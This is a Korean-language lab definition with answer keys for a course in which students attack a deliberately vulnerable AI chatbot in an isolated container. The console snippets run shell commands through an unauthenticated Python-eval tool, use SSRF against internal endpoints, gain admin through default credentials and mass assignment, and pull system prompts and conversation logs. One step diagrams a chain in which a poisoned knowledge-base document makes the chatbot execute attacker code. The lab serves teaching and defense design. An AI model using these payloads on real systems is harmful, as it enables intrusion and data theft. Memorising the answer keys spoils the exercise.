lab_id: ezweb-ai03
title: "도구를 쥔 챗봇 · 모델 절취 · 그리고 방어 설계 — 공격자에서 방어자로"
course: ai-web-hacking
week: 103
description: |
  특별 세션 3주차(마지막) 실습. 챗봇이 **손발(도구)** 까지 갖고 있을 때 무슨 일이 벌어지는지
  직접 확인한다. 인증 없는 코드 실행 도구로 서버에서 명령을 돌리고, SSRF 로 서버에게 심부름을
  시키고, 권한을 관리자로 올리고, 회사의 모델·데이터를 통째로 가져온다.
  그리고 마지막 시간, **방어자의 자리에 앉아** 이 서비스를 다시 설계하고 3주간의 발견을
  점검 보고서로 정리한다. 이 세션의 결승선은 공격이 아니라 **"어떻게 고칠 것인가"** 다.

  ⭐ 전부 브라우저(크롬/엣지 + F12 콘솔)로 진행하며, 진짜 AI 모델 없이도 된다.
  ⚠️ 오늘 다루는 "서버 코드 실행"과 "SSRF" 는 실제 서비스에 하면 **중대한 범죄**다.
     우리 표적은 격리된 컨테이너이며, 그러라고 만들어 둔 것이다.
  표적: AICompanion `http://<victim-ip>:3005` · 계정 `alice / alice123`
difficulty: medium
duration_minutes: 180
prerequisites:
  - "특별 세션 1·2 통과 (정찰 + 프롬프트 인젝션 3종 체득)"
  - "F12 콘솔에서 fetch 를 실행할 수 있음 (Week 04 에서 익힘)"
  - "내 PC에서 AICompanion(:3005) 기동"
objectives:
  - "인증 없는 코드 실행 도구를 호출해 RCE 를 확인한다"
  - "SSRF 로 서버에게 대신 요청을 보내게 한다"
  - "인젝션 + 도구를 하나의 공격 사슬로 연결해 그린다"
  - "권한 상승과 기본 계정으로 관리자가 된다"
  - "모델·데이터 절취의 사업적 피해를 설명한다"
  - "다층 방어 5원칙으로 서비스를 다시 설계하고 점검 보고서를 완성한다"
pass_threshold: 0.6
steps:

  - order: 1
    instruction: |
      ## 🎯 목표 (LLM08) — 챗봇의 손발을 직접 잡아 본다
      인증 없는 **코드 실행 도구**를 호출해, 서버에서 코드가 도는 것을 확인한다.
      ## 개념 한 줄
      챗봇에게 준 도구에 인증도 제한도 없으면, 그 도구는 사실 '전 세계에 열린 코드 실행기'다.
      ## 💻 해보기 (브라우저 + F12 콘솔)
      1. `http://<victim-ip>:3005` 접속. `F12` → **Console** 탭.
      2. 먼저 **안전한 계산**으로 도구가 진짜 도는지 확인:
         ```javascript
         fetch('/api/tool/exec_python', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ code: '1+1' })
         }).then(r => r.json()).then(console.log);
         ```
         → `{ok: true, out: "2"}` 가 나오면 도구가 살아 있는 것이다.
      3. 이제 **서버에서 명령이 실행되는지** 확인:
         ```javascript
         fetch('/api/tool/exec_python', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ code: '__import__("os").popen("id").read()' })
         }).then(r => r.json()).then(console.log);
         ```
         → `uid=...` 로 시작하는 출력이 오면 **서버에서 명령이 실행된 것**이다.
      ## 🔎 확인할 것 (가장 중요)
      - 이 요청을 보내면서 **로그인을 했나?** → 시크릿 창에서도 되는지 확인해 보자.
      - Week 03 의 웹셸(`shell.php?c=id`)과 **결과가 같다.** 통로만 "AI 도구"로 바뀌었을 뿐이다.
      ## ✅ 합격 기준
      두 요청의 응답을 캡처하고, "인증 없이 서버 코드가 실행된다"는 사실을 설명한다.
      ## 🧰 도움말
      - 응답이 `{ok:false}` 면 코드 문법을 다시 확인한다(따옴표 주의).
      - 표적이 이상해지면 `cd infra && docker compose restart aicompanion` 으로 되돌린다.
      - ⚠️ 실제 서비스에 절대 금지. 우리 격리 표적에서만.
    hint: "F12 콘솔에서 /api/tool/exec_python 에 code 를 보내 본다. 먼저 1+1 로 확인."
    category: agency
    points: 25
    answer: |
      POST /api/tool/exec_python {"code":"1+1"} → {"ok":true,"out":"2"}
      POST /api/tool/exec_python {"code":"__import__(\"os\").popen(\"id\").read()"} → uid=... (서버 명령 실행)
      인증 없음 → 누구나 서버에서 코드 실행 가능(RCE).
    answer_detail: "LLM08/LLM07 — tool_exec_python() 이 eval() 을 인증 없이 노출(V09). Week03 웹셸과 동일한 결과(RCE)를 'AI 도구'라는 새 통로로 얻는다는 점을 학생이 연결하면 통과. 시크릿 창(비로그인)에서도 동작하는지 확인시키면 '인증 0'이 확실히 각인된다."
    verify:
      type: manual
      check: "인증 없이 exec_python 도구로 서버 명령이 실행되는 것을 확인·캡처했다."
    target: victim

  - order: 2
    instruction: |
      ## 🎯 목표 (LLM07) — SSRF: 서버에게 심부름 시키기
      서버가 **대신** 요청을 보내게 만들어, 내가 직접은 못 보는 것을 본다.
      ## 개념 한 줄
      경비원(서버)에게 금고방 내용을 읽어다 달라고 부탁하는 것. 서버는 내부망에 닿을 수 있다.
      ## 💻 해보기 (브라우저 + F12 콘솔)
      1. 먼저 **정상 동작 확인** — 서버가 자기 자신을 열어 보게 한다:
         ```javascript
         fetch('/api/tool/http_get?url=' + encodeURIComponent('http://127.0.0.1:3005/_health'))
           .then(r => r.json()).then(console.log);
         ```
         → 응답의 `body` 에 서버 상태 JSON 이 담겨 온다.
      2. 이제 **서버만 볼 수 있는 것**을 요청해 본다:
         ```javascript
         fetch('/api/tool/http_get?url=' + encodeURIComponent('http://127.0.0.1:3005/api/debug/prompt'))
           .then(r => r.json()).then(console.log);
         ```
      3. 강사가 안내하는 **내부망 주소**가 있다면 그것도 시도해 본다.
      ## 🔎 확인할 것
      - `127.0.0.1` 은 "이 요청을 처리하는 컴퓨터 자신"을 뜻한다. 내 브라우저에서 그 주소를 치면
        **내 컴퓨터**를 가리키지만, 서버가 대신 요청하면 **서버 자신**을 가리킨다.
      - 이 차이가 SSRF 의 핵심이다. "누가 요청을 보내느냐"가 접근 권한을 바꾼다.
      ## ✅ 합격 기준
      두 요청의 응답을 캡처하고, "왜 서버가 대신 요청하면 위험한가"를 설명한다.
      ## 🧰 실전 의미
      클라우드 서버에는 자기 자신만 열 수 있는 **설정·자격증명 주소**가 있다. SSRF 로 그곳을
      열게 하면 서버의 임시 열쇠가 통째로 유출된다. 실제 대형 침해 사고 여럿이 이렇게 시작됐다.
    hint: "/api/tool/http_get?url=... 로 서버에게 127.0.0.1 주소를 열게 시킨다"
    category: agency
    points: 20
    answer: |
      GET /api/tool/http_get?url=http://127.0.0.1:3005/_health → 서버가 대신 요청한 결과가 body 로 옴
      같은 방법으로 서버만 접근 가능한 경로의 내용을 끌어올 수 있다(SSRF).
    answer_detail: "LLM07 — tool_http_get() 이 urlopen 에 사용자 URL 을 그대로 넘긴다(V10). 학생이 '요청 주체가 바뀌면 접근 권한이 바뀐다'를 말하면 통과. 실제 클라우드 메타데이터 유출 사례와 연결해 설명할 것."
    verify:
      type: manual
      check: "서버가 대신 요청한 결과를 받아 보고, SSRF 의 위험을 설명했다."
    target: victim

  - order: 3
    instruction: |
      ## 🎯 목표 — 공격 사슬 그리기 (지난주 + 오늘)
      개별 취약점보다 **연결**이 훨씬 위험하다는 것을 그림으로 정리한다.
      ## 개념 한 줄
      "글자 한 줄이 서버 장악으로 이어진다" — 인젝션 + 도구가 만나면 그렇게 된다.
      ## 💻 해보기 (워크북에 직접 그리기 — 코딩 없음)
      아래 5단계를 종이(또는 워크북)에 그리고, **각 단계 옆에 그 단계를 끊는 방어책**을 적는다.

      | 단계 | 무슨 일이 일어나나 | 이 단계를 끊는 방어책 |
      |------|--------------------|------------------------|
      | ① | 공격자가 지식베이스에 명령이 숨은 문서를 넣는다 | (예: 문서 추가에 인증·검수) |
      | ② | 아무것도 모르는 직원이 평범한 질문을 한다 | (예: —, 피해자는 잘못이 없다) |
      | ③ | 챗봇이 그 문서를 꺼내 읽고 명령을 지시로 받아들인다 | (예: 문서를 '자료'로 표시, 지시로 안 읽게) |
      | ④ | 챗봇이 도구를 호출한다 | (예: 도구 권한 최소화·허용 목록) |
      | ⑤ | 서버에서 공격자의 코드가 실행된다 | (예: 코드 실행 도구 제거, 사람 승인) |

      마지막에 한 문장으로 적는다:
      **"이 사슬을 끊으려면 어느 단계가 가장 효과적인가? 왜?"**
      ## ✅ 합격 기준
      5단계 표를 완성하고, 가장 효과적인 방어 단계와 그 이유를 발표한다.
      ## 🧰 생각해 볼 것
      대부분의 전문가는 **④·⑤(권한 최소화)** 를 꼽는다. ③(모델이 안 속게 하기)은 완벽할 수
      없기 때문이다. **"속지 않게" 보다 "속아도 괜찮게"** — 이게 오늘의 핵심 원칙이다.
    hint: "각 단계 옆에 '이 단계를 끊는 방법'을 적는다"
    category: analysis
    points: 15
    answer: |
      ①문서 오염 → ②평범한 질문 → ③챗봇이 지시로 읽음 → ④도구 호출 → ⑤서버 코드 실행
      가장 효과적인 차단 지점: ④·⑤ (권한 최소화 + 사람 승인). ③(모델이 안 속게)은 완전 차단 불가.
    answer_detail: "3주 세션의 개념적 정점. 학생이 '모델을 고치는 것보다 권한을 줄이는 것이 효과적'이라는 결론에 스스로 도달하면 통과. 이것이 다음 단계(방어 설계)의 논리적 근거가 된다."
    verify:
      type: manual
      check: "5단계 사슬과 각 단계의 방어책을 표로 작성하고 발표했다."
    target: attacker

  - order: 4
    instruction: |
      ## 🎯 목표 (A01/A07) — AI 서비스 사고의 절반은 '평범한 웹 취약점'
      권한 상승과 기본 계정으로 관리자가 된다.
      ## 개념 한 줄
      AI 부분만 신경 쓰다 기본을 놓치는 게 실제로 가장 흔한 사고다.
      ## 💻 해보기 (브라우저만)
      **① 기본 계정 확인 (가장 쉬운 공격)**
      시크릿 창에서 `http://<victim-ip>:3005/login` → `admin` / `admin` 으로 로그인해 본다.
      → 들어가진다. 첫 화면의 안내 문구에도 계정이 적혀 있었다(1주차 정찰 복습).

      **② 권한 상승 (Mass Assignment)** — `alice` 로 로그인한 창에서 `F12` → **Console**:
      ```javascript
      fetch('/profile', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'memory=' + encodeURIComponent('나는 파이썬을 선호합니다.') + '&role=admin'
      }).then(() => location.href = '/profile');
      ```
      그다음 화면 오른쪽 위의 **내 역할 표시**를 확인한다.
      ## 🔎 확인할 것
      - 프로필 화면의 폼에는 `role` 칸이 **없었다.** 그런데 서버는 받아 준다.
      - 이게 Week 04 NeoBank 에서 본 **Mass Assignment** 와 똑같은 결함이다.
      ## ✅ 합격 기준
      기본 계정 로그인 성공과 role 변경(관리자 표시) 중 **하나 이상**을 캡처한다.
      ## 🧰 실전 의미
      "AI 보안"이라는 새 이름에 현혹되지 말자. **API 인증 · 기본 비밀번호 변경 · 받을 필드 제한**
      같은 기본기가 여전히 방어의 절반 이상이다.
    hint: "admin/admin 로그인 + F12 콘솔로 프로필에 role=admin 을 끼워 넣는다"
    category: privesc
    points: 15
    answer: |
      ① admin / admin 기본 계정 그대로 로그인 (V24)
      ② POST /profile 에 role=admin 을 끼워 넣으면 화면에 없던 필드까지 반영됨 (V23 Mass assignment)
    answer_detail: "평범한 웹 취약점의 재확인. profile() 이 fields 목록에 role 을 포함해 폼 값을 그대로 UPDATE 한다. 학생이 'AI 서비스라도 기본 웹 보안이 절반'이라는 결론을 말하면 통과."
    verify:
      type: manual
      check: "기본 계정 로그인 또는 role=admin 상승 중 하나 이상을 확인·캡처했다."
    target: victim

  - order: 5
    instruction: |
      ## 🎯 목표 (LLM10) — 모델·데이터 절취
      회사가 만든 자산이 통째로 복제될 수 있음을 확인한다.
      ## 개념 한 줄
      AI 서비스에서는 개인정보뿐 아니라 '모델·프롬프트·지식베이스·대화기록'이 모두 자산이다.
      ## 💻 해보기 (브라우저만)
      주소창에 넣는다(시크릿 창에서도 열리는지 함께 확인):
      ```
      http://<victim-ip>:3005/api/dataset
      http://<victim-ip>:3005/api/model/export
      http://<victim-ip>:3005/api/debug/prompt
      ```
      ## 🔎 확인할 것
      1. `/api/dataset` 안에서 **지난주와 오늘 내가 나눈 대화**를 찾아본다.
         → 내 대화가 보인다는 것은 **남의 대화도 다 보인다**는 뜻이다.
      2. 세 응답을 합치면 무엇이 되는가?
         → 시스템 프롬프트(노하우) + 지식베이스(내부 지식) + 대화기록(사용자 데이터) + 모델 정보
         = **이 서비스를 그대로 복제할 수 있는 한 세트.**
      ## ✅ 합격 기준
      `/api/dataset` 안에서 내 대화를 찾아 캡처하고, "이게 새면 회사에 어떤 손해인가"를
      **개인정보 피해 / 사업 피해** 두 갈래로 나눠 적는다.
      ## 🧰 실전 의미
      개인정보 유출은 법적 책임이고, 모델·프롬프트 유출은 **경쟁 우위의 상실**이다. 둘은 다른
      종류의 피해이며, 보고서에는 **둘 다** 적어야 한다.
    hint: "/api/dataset 에서 내가 나눈 대화를 찾아본다"
    category: leak
    points: 10
    answer: |
      /api/dataset → RAG 문서 + 전체 대화 기록(내 대화 포함, 인증 0)
      /api/model/export → 모델·가중치 정보
      /api/debug/prompt → 시스템 프롬프트(노하우)
